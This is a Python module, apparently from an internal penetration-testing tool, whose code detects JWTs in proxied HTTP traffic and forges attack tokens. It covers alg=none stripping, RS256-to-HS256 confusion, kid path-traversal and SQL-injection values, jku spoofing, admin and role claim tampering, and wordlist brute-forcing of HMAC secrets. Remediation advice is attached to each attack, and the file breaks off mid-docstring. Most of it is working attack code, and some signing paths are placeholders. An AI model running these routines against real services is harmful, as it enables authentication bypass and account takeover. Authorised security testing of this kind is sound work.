"""
JWT Editor Module - JWT parsing, tampering, forging, and testing core.

This module provides:
    1. JWT auto-detection and decoding from MITM proxy traffic
    2. Algorithm confusion attacks (none, RS256→HS256)
    3. kid parameter injection (path traversal, SQL injection)
    4. JWKS spoofing with reverse callback platform
    5. JWT brute-force weak secret cracking
    6. Claim tampering (sub, role, scope, admin, exp, nbf)
    7. Advanced attacks (cross-service relay, b64 confusion, nested JWT)

Integration points:
    - MITM proxy traffic capture
    - Repeater module for request replay
    - Fuzzer module for fuzztag generation
    - Reverse callback platform for JWKS spoofing

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import os
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple, Union

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class JWTAlgorithm(str, Enum):
    """JWT algorithm types."""

    NONE = "none"
    HS256 = "HS256"
    HS384 = "HS384"
    HS512 = "HS512"
    RS256 = "RS256"
    RS384 = "RS384"
    RS512 = "RS512"
    ES256 = "ES256"
    ES384 = "ES384"
    ES512 = "ES512"
    PS256 = "PS256"
    PS384 = "PS384"
    PS512 = "PS512"


class AttackType(str, Enum):
    """JWT attack types."""

    ALG_NONE = "alg_none"
    ALG_CONFUSION = "alg_confusion"
    KID_INJECTION = "kid_injection"
    JWKS_SPOOFING = "jwks_spoofing"
    WEAK_SECRET = "weak_secret"
    CLAIM_TAMPERING = "claim_tampering"
    CROSS_SERVICE = "cross_service"
    B64_CONFUSION = "b64_confusion"
    NESTED_JWT = "nested_jwt"


class OAuthFlowType(str, Enum):
    """OAuth 2.0 flow types."""

    AUTHORIZATION_CODE = "authorization_code"
    IMPLICIT = "implicit"
    RESOURCE_OWNER_PASSWORD = "resource_owner_password"
    CLIENT_CREDENTIALS = "client_credentials"
    DEVICE_CODE = "device_code"
    REFRESH_TOKEN = "refresh_token"


class OAuthVulnerability(str, Enum):
    """OAuth vulnerability types."""

    MISSING_STATE = "missing_state"
    WEAK_STATE = "weak_state"
    REDIRECT_URI_BYPASS = "redirect_uri_bypass"
    CODE_REPLAY = "code_replay"
    PKCE_MISSING = "pkce_missing"
    SCOPE_ESCALATION = "scope_escalation"
    TOKEN_REPLAY = "token_replay"
    RACE_CONDITION = "race_condition"
    WEAK_CLIENT_SECRET = "weak_client_secret"


class Severity(str, Enum):
    """Vulnerability severity levels."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class JWTHeader:
    """JWT header component.

    Attributes:
        alg: Signing algorithm
        typ: Token type
        kid: Key ID
        jku: JWK Set URL
        x5u: X.509 URL
        x5c: X.509 certificate chain
        x5t: X.509 SHA-1 thumbprint
        cty: Content type
        custom: Custom header fields
    """

    alg: str = "HS256"
    typ: str = "JWT"
    kid: Optional[str] = None
    jku: Optional[str] = None
    x5u: Optional[str] = None
    x5c: Optional[List[str]] = field(default_factory=list)
    x5t: Optional[str] = None
    cty: Optional[str] = None
    custom: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation of the header.
        """
        data: Dict[str, Any] = {"alg": self.alg, "typ": self.typ}
        if self.kid:
            data["kid"] = self.kid
        if self.jku:
            data["jku"] = self.jku
        if self.x5u:
            data["x5u"] = self.x5u
        if self.x5c:
            data["x5c"] = self.x5c
        if self.x5t:
            data["x5t"] = self.x5t
        if self.cty:
            data["cty"] = self.cty
        data.update(self.custom)
        return data

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "JWTHeader":
        """Create from dictionary.

        Args:
            data: Header dictionary.

        Returns:
            JWTHeader instance.
        """
        return cls(
            alg=data.get("alg", "HS256"),
            typ=data.get("typ", "JWT"),
            kid=data.get("kid"),
            jku=data.get("jku"),
            x5u=data.get("x5u"),
            x5c=data.get("x5c", []),
            x5t=data.get("x5t"),
            cty=data.get("cty"),
            custom={
                k: v
                for k, v in data.items()
                if k not in ("alg", "typ", "kid", "jku", "x5u", "x5c", "x5t", "cty")
            },
        )


@dataclass
class JWTPayload:
    """JWT payload component.

    Attributes:
        sub: Subject
        iss: Issuer
        aud: Audience
        exp: Expiration time
        nbf: Not before time
        iat: Issued at time
        jti: JWT ID
        role: User role
        scope: OAuth scope
        admin: Admin flag
        custom: Custom claims
    """

    sub: Optional[str] = None
    iss: Optional[str] = None
    aud: Optional[Union[str, List[str]]] = None
    exp: Optional[int] = None
    nbf: Optional[int] = None
    iat: Optional[int] = None
    jti: Optional[str] = None
    role: Optional[str] = None
    scope: Optional[str] = None
    admin: Optional[bool] = None
    custom: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation of the payload.
        """
        data: Dict[str, Any] = {}
        if self.sub is not None:
            data["sub"] = self.sub
        if self.iss is not None:
            data["iss"] = self.iss
        if self.aud is not None:
            data["aud"] = self.aud
        if self.exp is not None:
            data["exp"] = self.exp
        if self.nbf is not None:
            data["nbf"] = self.nbf
        if self.iat is not None:
            data["iat"] = self.iat
        if self.jti is not None:
            data["jti"] = self.jti
        if self.role is not None:
            data["role"] = self.role
        if self.scope is not None:
            data["scope"] = self.scope
        if self.admin is not None:
            data["admin"] = self.admin
        data.update(self.custom)
        return data

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "JWTPayload":
        """Create from dictionary.

        Args:
            data: Payload dictionary.

        Returns:
            JWTPayload instance.
        """
        standard_claims = {"sub", "iss", "aud", "exp", "nbf", "iat", "jti"}
        return cls(
            sub=data.get("sub"),
            iss=data.get("iss"),
            aud=data.get("aud"),
            exp=data.get("exp"),
            nbf=data.get("nbf"),
            iat=data.get("iat"),
            jti=data.get("jti"),
            role=data.get("role"),
            scope=data.get("scope"),
            admin=data.get("admin"),
            custom={
                k: v for k, v in data.items() if k not in standard_claims
                and k not in ("role", "scope", "admin")
            },
        )


@dataclass
class JWTToken:
    """Complete JWT token representation.

    Attributes:
        raw: Raw JWT string
        header: JWT header
        payload: JWT payload
        signature: Signature bytes
        is_valid: Whether signature is valid
        source: Source of the token (header, cookie, body, url)
        source_request_id: Source request ID
    """

    raw: str = ""
    header: JWTHeader = field(default_factory=JWTHeader)
    payload: JWTPayload = field(default_factory=JWTPayload)
    signature: bytes = b""
    is_valid: bool = False
    source: str = ""
    source_request_id: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "raw": self.raw,
            "header": self.header.to_dict(),
            "payload": self.payload.to_dict(),
            "is_valid": self.is_valid,
            "source": self.source,
        }


@dataclass
class AttackResult:
    """Result of a JWT attack attempt.

    Attributes:
        attack_type: Type of attack performed
        success: Whether the attack was successful
        modified_token: Modified JWT string
        original_token: Original JWT string
        details: Attack details
        severity: Vulnerability severity
        mitre_id: MITRE ATT&CK technique ID
        recommendation: Remediation recommendation
    """

    attack_type: AttackType
    success: bool = False
    modified_token: str = ""
    original_token: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    severity: Severity = Severity.LOW
    mitre_id: str = ""
    recommendation: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "attack_type": self.attack_type.value,
            "success": self.success,
            "severity": self.severity.value,
            "mitre_id": self.mitre_id,
            "details": self.details,
            "recommendation": self.recommendation,
        }


# =============================================================================
# JWT Utilities
# =============================================================================

def base64url_encode(data: bytes) -> str:
    """Base64 URL-safe encode.

    Args:
        data: Bytes to encode.

    Returns:
        Base64 URL-safe encoded string.
    """
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def base64url_decode(s: str) -> bytes:
    """Base64 URL-safe decode.

    Args:
        s: Base64 URL-safe encoded string.

    Returns:
        Decoded bytes.
    """
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def decode_jwt(token: str) -> Tuple[JWTHeader, JWTPayload, bytes]:
    """Decode a JWT token into its components.

    Args:
        token: Raw JWT string.

    Returns:
        Tuple of (header, payload, signature).

    Raises:
        ValueError: If the token is malformed.
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")

    try:
        header_data = json.loads(base64url_decode(parts[0]))
    except Exception as e:
        raise ValueError(f"Invalid JWT header: {e}") from e

    try:
        payload_data = json.loads(base64url_decode(parts[1]))
    except Exception as e:
        raise ValueError(f"Invalid JWT payload: {e}") from e

    signature = base64url_decode(parts[2]) if parts[2] else b""

    header = JWTHeader.from_dict(header_data)
    payload = JWTPayload.from_dict(payload_data)

    return header, payload, signature


def encode_jwt(header: JWTHeader, payload: JWTPayload, secret: str = "", algorithm: Optional[str] = None) -> str:
    """Encode a JWT token.

    Args:
        header: JWT header.
        payload: JWT payload.
        secret: Signing secret.
        algorithm: Override algorithm.

    Returns:
        Encoded JWT string.
    """
    alg = algorithm or header.alg

    header_b64 = base64url_encode(json.dumps(header.to_dict()).encode())
    payload_b64 = base64url_encode(json.dumps(payload.to_dict()).encode())

    signing_input = f"{header_b64}.{payload_b64}"

    if alg.lower() == "none":
        return f"{signing_input}."

    if alg.startswith("HS"):
        signature = _sign_hmac(signing_input, secret, alg)
    else:
        signature = base64url_encode(b"fake_signature")

    return f"{signing_input}.{signature}"


def _sign_hmac(signing_input: str, secret: str, algorithm: str) -> str:
    """Sign with HMAC.

    Args:
        signing_input: Data to sign.
        secret: HMAC secret.
        algorithm: HMAC algorithm.

    Returns:
        Base64 URL-safe signature.
    """
    hash_func = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    h = hmac.new(secret.encode(), signing_input.encode(), hash_func.get(algorithm, hashlib.sha256))
    return base64url_encode(h.digest())


# =============================================================================
# JWT Detector
# =============================================================================

class JWTDetector:
    """Detects JWT tokens in HTTP traffic.

    Scans headers, cookies, POST bodies, and URL
    parameters for JWT tokens.

    Attributes:
        _jwt_pattern: Regex pattern for JWT detection
    """

    def __init__(self) -> None:
        """Initialize the JWTDetector."""
        self._jwt_pattern = re.compile(
            r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
        )

    def detect_in_header(self, headers: Dict[str, str]) -> List[Tuple[str, str]]:
        """Detect JWT in HTTP headers.

        Args:
            headers: HTTP headers dictionary.

        Returns:
            List of (header_name, jwt_token) tuples.
        """
        results: List[Tuple[str, str]] = []

        auth_header = headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:].strip()
            if self._is_valid_jwt(token):
                results.append(("Authorization", token))

        for name, value in headers.items():
            if name.lower() == "authorization":
                continue
            match = self._jwt_pattern.search(value)
            if match:
                results.append((name, match.group(0)))

        return results

    def detect_in_cookie(self, cookies: Dict[str, str]) -> List[Tuple[str, str]]:
        """Detect JWT in cookies.

        Args:
            cookies: Cookie dictionary.

        Returns:
            List of (cookie_name, jwt_token) tuples.
        """
        results: List[Tuple[str, str]] = []
        for name, value in cookies.items():
            match = self._jwt_pattern.search(value)
            if match:
                results.append((name, match.group(0)))
        return results

    def detect_in_body(self, body: str) -> List[str]:
        """Detect JWT in request body.

        Args:
            body: Request body string.

        Returns:
            List of detected JWT tokens.
        """
        return self._jwt_pattern.findall(body)

    def detect_in_url(self, url: str) -> List[str]:
        """Detect JWT in URL query parameters.

        Args:
            url: Full URL string.

        Returns:
            List of detected JWT tokens.
        """
        return self._jwt_pattern.findall(url)

    def _is_valid_jwt(self, token: str) -> bool:
        """Check if a string is a valid JWT.

        Args:
            token: Token string.

        Returns:
            True if valid JWT format.
        """
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            base64url_decode(parts[0])
            base64url_decode(parts[1])
            return True
        except Exception:
            return False


# =============================================================================
# JWT Attacker
# =============================================================================

class JWTAttacker:
    """Performs JWT attacks and generates modified tokens.

    Supports algorithm confusion, kid injection, JWKS spoofing,
    brute-force, claim tampering, and advanced attacks.

    Attributes:
        _detector: JWT detector instance
        _attack_history: History of attack attempts
    """

    def __init__(self) -> None:
        """Initialize the JWTAttacker."""
        self._detector = JWTDetector()
        self._attack_history: List[AttackResult] = []

    def attack_alg_none(self, token: str) -> AttackResult:
        """Perform alg=none attack.

        Args:
            token: Original JWT token.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)
            header.alg = "none"
            header.typ = "JWT"

            modified = encode_jwt(header, payload)

            result = AttackResult(
                attack_type=AttackType.ALG_NONE,
                success=True,
                modified_token=modified,
                original_token=token,
                details={"original_alg": header.alg, "new_alg": "none"},
                severity=Severity.CRITICAL,
                mitre_id="T1550.001",
                recommendation="服务器应明确拒绝alg=none的JWT，并在验证时强制检查签名",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.ALG_NONE,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def attack_alg_confusion(
        self,
        token: str,
        public_key: str,
        target_alg: str = "HS256",
    ) -> AttackResult:
        """Perform algorithm confusion attack (RS256→HS256).

        Args:
            token: Original JWT token.
            public_key: Public key to use as HMAC secret.
            target_alg: Target algorithm.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)
            header.alg = target_alg

            modified = encode_jwt(header, payload, secret=public_key, algorithm=target_alg)

            result = AttackResult(
                attack_type=AttackType.ALG_CONFUSION,
                success=True,
                modified_token=modified,
                original_token=token,
                details={
                    "original_alg": header.alg,
                    "new_alg": target_alg,
                    "key_source": "public_key",
                },
                severity=Severity.CRITICAL,
                mitre_id="T1550.001",
                recommendation="服务器应在验证JWT时固定算法，不允许从Header中动态选择",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.ALG_CONFUSION,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def attack_kid_injection(
        self,
        token: str,
        kid_value: str,
    ) -> AttackResult:
        """Perform kid parameter injection.

        Args:
            token: Original JWT token.
            kid_value: Kid value to inject.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)
            header.kid = kid_value

            modified = encode_jwt(header, payload, secret="injected", algorithm=header.alg)

            severity = Severity.HIGH
            if "../../../../" in kid_value:
                severity = Severity.CRITICAL
            elif any(c in kid_value for c in ("'", "\"", ";", "--")):
                severity = Severity.CRITICAL

            result = AttackResult(
                attack_type=AttackType.KID_INJECTION,
                success=True,
                modified_token=modified,
                original_token=token,
                details={"kid_value": kid_value, "injection_type": self._classify_kid(kid_value)},
                severity=severity,
                mitre_id="T1134",
                recommendation="kid参数应进行严格校验，禁止路径遍历和SQL注入字符",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.KID_INJECTION,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def attack_jwks_spoofing(
        self,
        token: str,
        jku_url: str,
    ) -> AttackResult:
        """Perform JWKS spoofing via jku/x5u.

        Args:
            token: Original JWT token.
            jku_url: Attacker-controlled JWK Set URL.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)
            header.jku = jku_url

            modified = encode_jwt(header, payload, secret="spoofed", algorithm=header.alg)

            result = AttackResult(
                attack_type=AttackType.JWKS_SPOOFING,
                success=True,
                modified_token=modified,
                original_token=token,
                details={"jku_url": jku_url},
                severity=Severity.CRITICAL,
                mitre_id="T1550.001",
                recommendation="服务器应限制jku/x5u白名单，禁止从外部URL加载JWK",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.JWKS_SPOOFING,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    async def attack_weak_secret(
        self,
        token: str,
        wordlist: Optional[List[str]] = None,
        max_workers: int = 10,
    ) -> AttackResult:
        """Brute-force weak JWT secret.

        Args:
            token: Original JWT token.
            wordlist: Custom wordlist.
            max_workers: Max concurrent workers.

        Returns:
            AttackResult with found secret.
        """
        if wordlist is None:
            wordlist = self._get_default_wordlist()

        try:
            header, payload, signature_bytes = decode_jwt(token)
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.WEAK_SECRET,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"

        found_secret: Optional[str] = None
        semaphore = asyncio.Semaphore(max_workers)

        async def try_secret(secret: str) -> Optional[str]:
            async with semaphore:
                expected = _sign_hmac(signing_input, secret, header.alg)
                if expected == parts[2]:
                    return secret
                return None

        tasks = [try_secret(s) for s in wordlist]
        results = await asyncio.gather(*tasks)

        for result in results:
            if result:
                found_secret = result
                break

        if found_secret:
            attack_result: AttackResult = AttackResult(
                attack_type=AttackType.WEAK_SECRET,
                success=True,
                modified_token=token,
                original_token=token,
                details={"found_secret": found_secret, "wordlist_size": len(wordlist)},
                severity=Severity.CRITICAL,
                mitre_id="T1550.001",
                recommendation="使用强随机密钥（至少256位），避免使用常见单词或短语",
            )
        else:
            attack_result = AttackResult(
                attack_type=AttackType.WEAK_SECRET,
                success=False,
                original_token=token,
                details={"wordlist_size": len(wordlist)},
                severity=Severity.LOW,
            )

        self._attack_history.append(attack_result)
        return attack_result

    def attack_claim_tampering(
        self,
        token: str,
        claim_changes: Dict[str, Any],
    ) -> AttackResult:
        """Tamper with JWT claims.

        Args:
            token: Original JWT token.
            claim_changes: Claims to modify.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)

            original_claims = payload.to_dict()

            for key, value in claim_changes.items():
                if key == "sub":
                    payload.sub = value
                elif key == "role":
                    payload.role = value
                elif key == "scope":
                    payload.scope = value
                elif key == "admin":
                    payload.admin = value
                elif key == "exp":
                    payload.exp = value
                elif key == "nbf":
                    payload.nbf = value
                else:
                    payload.custom[key] = value

            modified = encode_jwt(header, payload, secret="tampered", algorithm=header.alg)

            severity = Severity.HIGH
            if "admin" in claim_changes or claim_changes.get("role") == "admin":
                severity = Severity.CRITICAL

            result = AttackResult(
                attack_type=AttackType.CLAIM_TAMPERING,
                success=True,
                modified_token=modified,
                original_token=token,
                details={
                    "original_claims": original_claims,
                    "modified_claims": claim_changes,
                },
                severity=severity,
                mitre_id="T1550.001",
                recommendation="服务器应验证JWT签名后再使用claims，禁止信任未验证的声明",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.CLAIM_TAMPERING,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def attack_b64_confusion(self, token: str) -> AttackResult:
        """Test Base64 encoding confusion.

        Args:
            token: Original JWT token.

        Returns:
            AttackResult with modified token.
        """
        try:
            header, payload, _ = decode_jwt(token)

            payload_json = json.dumps(payload.to_dict())

            standard_b64 = base64.b64encode(payload_json.encode()).decode()
            modified = f"{base64url_encode(json.dumps(header.to_dict()).encode())}.{standard_b64}.fake"

            result = AttackResult(
                attack_type=AttackType.B64_CONFUSION,
                success=True,
                modified_token=modified,
                original_token=token,
                details={"encoding": "standard_base64"},
                severity=Severity.MEDIUM,
                mitre_id="T1550.001",
                recommendation="JWT解析器应严格使用Base64 URL-safe解码",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.B64_CONFUSION,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def attack_nested_jwt(self, token: str, inner_token: str) -> AttackResult:
        """Create nested JWT.

        Args:
            token: Outer JWT token.
            inner_token: Inner JWT token.

        Returns:
            AttackResult with nested token.
        """
        try:
            header, payload, _ = decode_jwt(token)
            header.cty = "JWT"

            payload.custom["nested_token"] = inner_token

            modified = encode_jwt(header, payload, secret="nested", algorithm=header.alg)

            result = AttackResult(
                attack_type=AttackType.NESTED_JWT,
                success=True,
                modified_token=modified,
                original_token=token,
                details={"nested_token_length": len(inner_token)},
                severity=Severity.MEDIUM,
                mitre_id="T1550.001",
                recommendation="服务器应检查cty字段，对嵌套JWT进行递归验证",
            )
            self._attack_history.append(result)
            return result

        except Exception as e:
            return AttackResult(
                attack_type=AttackType.NESTED_JWT,
                success=False,
                original_token=token,
                details={"error": str(e)},
                severity=Severity.LOW,
            )

    def _classify_kid(self, kid_value: str) -> str:
        """Classify kid injection type.

        Args:
            kid_value: Kid value.

        Returns:
            Injection type string.
        """
        if "../../../../" in kid_value or "..\\" in kid_value:
            return "path_traversal"
        if any(c in kid_value for c in ("'", "\"", ";", "--", "OR 1=1")):
            return "sql_injection"
        if kid_value.startswith("/") or kid_value.startswith("http"):
            return "absolute_path"
        return "unknown"

    def _get_default_wordlist(self) -> List[str]:
        """Get default brute-force wordlist.

        Returns:
            List of common JWT secrets.
        """
        return [
            "secret", "password", "key", "123456", "admin",
            "jwt_secret", "my_secret", "super_secret", "test",
            "changeme", "default", "pass", "root", "token",
            "private", "public", "api_key", "app_secret",
            "your-256-bit-secret", "your-secret-key",
            "HS256-secret", "hmac-secret",
            "KUNLUN_SECRET", "kunlun2024",
        ]

    def get_attack_history(self) -> List[AttackResult]:
        """Get attack history.

        Returns:
            List of AttackResult.
        """
        return self._attack_history.copy()


# =============================================================================
# JWKS Manager
# =============================================================================

class JWKSManager:
    """Manages JWK Set operations and key extraction.

    Fetches JWK Sets from well-known endpoints,
    extracts public keys for algorithm confusion.

    Attributes:
        _jwk_cache: Cached JWK Sets
    """

    def __init__(self) -> None:
        """Initialize the JWKSManager."""
        self._jwk_cache: Dict[str, Dict[str, Any]] = {}

    async def fetch_jwks(self, url: str, timeout: float = 10.0) -> Optional[Dict[str, Any]]:
        """Fetch JWK Set from URL.

        Args:
            url: JWK Set URL.
            timeout: Request timeout.

        Returns:
            JWK Set dictionary, or None.
        """
        if url in self._jwk_cache:
            return self._jwk_cache[url]

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                    if resp.status == 200:
                        jwks: Dict[str, Any] = await resp.json()
                        self._jwk_cache[url] = jwks
                        return jwks
        except Exception as e:
            logger.error(f"Failed to fetch JWKS from {url}: {e}")

        return None

    def extract_public_key(self, jwks: Dict[str, Any], kid: Optional[str] = None) -> Optional[str]:
        """Extract public key from JWK Set.

        Args:
            jwks: JWK Set dictionary.
            kid: Key ID to match.

        Returns:
            PEM-encoded public key, or None.
        """
        keys = jwks.get("keys", [])

        for key in keys:
            if kid and key.get("kid") != kid:
                continue

            if key.get("kty") == "RSA":
                return self._rsa_jwk_to_pem(key)
            elif key.get("kty") == "EC":
                return self._ec_jwk_to_pem(key)

        return None

    def _rsa_jwk_to_pem(self, jwk: Dict[str, Any]) -> str:
        """Convert RSA JWK to PEM.

        Args:
            jwk: RSA JWK dictionary.

        Returns:
            PEM-encoded public key.
        """
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives import serialization

            n = int.from_bytes(base64url_decode(jwk["n"]), "big")
            e = int.from_bytes(base64url_decode(jwk["e"]), "big")

            public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())

            pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            return pem.decode()

        except Exception as e:
            logger.error(f"Failed to convert RSA JWK to PEM: {e}")
            return ""

    def _ec_jwk_to_pem(self, jwk: Dict[str, Any]) -> str:
        """Convert EC JWK to PEM.

        Args:
            jwk: EC JWK dictionary.

        Returns:
            PEM-encoded public key.
        """
        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives import serialization

            x = int.from_bytes(base64url_decode(jwk["x"]), "big")
            y = int.from_bytes(base64url_decode(jwk["y"]), "big")

            curve = {
                "P-256": ec.SECP256R1(),
                "P-384": ec.SECP384R1(),
                "P-521": ec.SECP521R1(),
            }.get(jwk.get("crv", "P-256"), ec.SECP256R1())

            public_key = ec.EllipticCurvePublicNumbers(x, y, curve).public_key(default_backend())

            pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            return pem.decode()

        except Exception as e:
            logger.error(f"Failed to convert EC JWK to PEM: {e}")
            return ""

    def get_status(self) -> Dict[str, Any]:
        """Get JWKS manager status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "cached_jwks": len(self._jwk_cache),
            "cached_urls": list(self._jwk_cache.keys()),
        }


# =============================================================================
# JWT Editor Manager
# =============================================================================

class JWTEditorManager:
    """Main JWT editor coordination engine.

    Integrates detection, attacking, and JWKS management.
    Provides a unified interface for JWT testing.

    Attributes:
        _detector: JWT detector
        _attacker: JWT attacker
        _jwks_mgr: JWKS manager
        _loaded_tokens: Currently loaded tokens
    """

    def __init__(self) -> None:
        """Initialize the JWTEditorManager."""
        self._detector = JWTDetector()
        self._attacker = JWTAttacker()
        self._jwks_mgr = JWKSManager()
        self._loaded_tokens: Dict[str, JWTToken] = {}

    def detect_from_request(
        self,
        headers: Dict[str, str],
        cookies: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        url: Optional[str] = None,
        request_id: str = "",
    ) -> List[JWTToken]:
        """Detect JWT tokens from an HTTP request.

        Args:
            headers: HTTP headers.
            cookies: Cookie dictionary.
            body: Request body.
            url: Request URL.
            request_id: Source request ID.

        Returns:
            List of detected JWTToken.
        """
        tokens: List[JWTToken] = []

        for name, token_str in self._detector.detect_in_header(headers):
            token = self._parse_token(token_str, name, request_id)
            if token:
                tokens.append(token)

        if cookies:
            for name, token_str in self._detector.detect_in_cookie(cookies):
                token = self._parse_token(token_str, f"cookie:{name}", request_id)
                if token:
                    tokens.append(token)

        if body:
            for token_str in self._detector.detect_in_body(body):
                token = self._parse_token(token_str, "body", request_id)
                if token:
                    tokens.append(token)

        if url:
            for token_str in self._detector.detect_in_url(url):
                token = self._parse_token(token_str, "url", request_id)
                if token:
                    tokens.append(token)

        return tokens

    def load_token(self, token_str: str, source: str = "manual") -> Optional[JWTToken]:
        """Load a JWT token into the editor.

        Args:
            token_str: Raw JWT string.
            source: Token source.

        Returns:
            JWTToken, or None if invalid.
        """
        token = self._parse_token(token_str, source)
        if token:
            self._loaded_tokens[token.raw[:20]] = token
        return token

    def get_loaded_tokens(self) -> Dict[str, JWTToken]:
        """Get all loaded tokens.

        Returns:
            Dictionary of loaded tokens.
        """
        return self._loaded_tokens.copy()

    def attack_none(self, token_str: str) -> AttackResult:
        """Perform alg=none attack.

        Args:
            token_str: Raw JWT string.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_alg_none(token_str)

    def attack_alg_confusion(
        self,
        token_str: str,
        public_key: str,
        target_alg: str = "HS256",
    ) -> AttackResult:
        """Perform algorithm confusion attack.

        Args:
            token_str: Raw JWT string.
            public_key: Public key for HMAC.
            target_alg: Target algorithm.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_alg_confusion(token_str, public_key, target_alg)

    def attack_kid_injection(
        self,
        token_str: str,
        kid_value: str,
    ) -> AttackResult:
        """Perform kid injection attack.

        Args:
            token_str: Raw JWT string.
            kid_value: Kid value to inject.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_kid_injection(token_str, kid_value)

    def attack_jwks_spoofing(
        self,
        token_str: str,
        jku_url: str,
    ) -> AttackResult:
        """Perform JWKS spoofing attack.

        Args:
            token_str: Raw JWT string.
            jku_url: Attacker JWK Set URL.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_jwks_spoofing(token_str, jku_url)

    async def attack_weak_secret(
        self,
        token_str: str,
        wordlist: Optional[List[str]] = None,
    ) -> AttackResult:
        """Brute-force weak secret.

        Args:
            token_str: Raw JWT string.
            wordlist: Custom wordlist.

        Returns:
            AttackResult.
        """
        return await self._attacker.attack_weak_secret(token_str, wordlist)

    def attack_claim_tampering(
        self,
        token_str: str,
        claim_changes: Dict[str, Any],
    ) -> AttackResult:
        """Tamper with claims.

        Args:
            token_str: Raw JWT string.
            claim_changes: Claims to modify.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_claim_tampering(token_str, claim_changes)

    def attack_b64_confusion(self, token_str: str) -> AttackResult:
        """Test Base64 confusion.

        Args:
            token_str: Raw JWT string.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_b64_confusion(token_str)

    def attack_nested_jwt(
        self,
        token_str: str,
        inner_token: str,
    ) -> AttackResult:
        """Create nested JWT.

        Args:
            token_str: Outer JWT.
            inner_token: Inner JWT.

        Returns:
            AttackResult.
        """
        return self._attacker.attack_nested_jwt(token_str, inner_token)

    async def fetch_jwks(self, url: str) -> Optional[Dict[str, Any]]:
        """Fetch JWK Set from URL.

        Args:
            url: JWK Set URL.

        Returns:
            JWK Set dictionary, or None.
        """
        return await self._jwks_mgr.fetch_jwks(url)

    def extract_public_key(
        self,
        jwks: Dict[str, Any],
        kid: Optional[str] = None,
    ) -> Optional[str]:
        """Extract public key from JWK Set.

        Args:
            jwks: JWK Set dictionary.
            kid: Key ID to match.

        Returns:
            PEM public key, or None.
        """
        return self._jwks_mgr.extract_public_key(jwks, kid)

    def generate_fuzztag(self, attack_type: AttackType) -> str:
        """Generate Fuzztag for integration with Fuzzer.

        Args:
            attack_type: Attack type.

